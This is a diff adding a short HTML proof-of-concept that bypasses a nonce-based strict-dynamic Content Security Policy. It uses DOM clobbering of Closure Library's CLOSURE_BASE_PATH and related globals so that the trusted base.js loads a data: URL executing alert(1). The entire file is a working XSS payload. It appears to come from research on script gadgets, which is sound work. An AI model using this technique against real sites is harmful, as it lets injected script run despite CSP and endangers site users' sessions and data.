@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+<meta http-equiv="content-security-policy" content="object-src 'none'; script-src 'nonce-secret' 'strict-dynamic';">
+</head>
+
+<body>
+
+xss<a id=CLOSURE_BASE_PATH href=data:/,1/alert(1)//></a><form id=CLOSURE_UNCOMPILED_DEFINES> <input id=goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING></form>xss
+
+
+
+
+
+<script nonce="secret" type="text/javascript" src="https://google.github.io/closure-library/source/closure/goog/base.js"></script>
+
+
+</html>
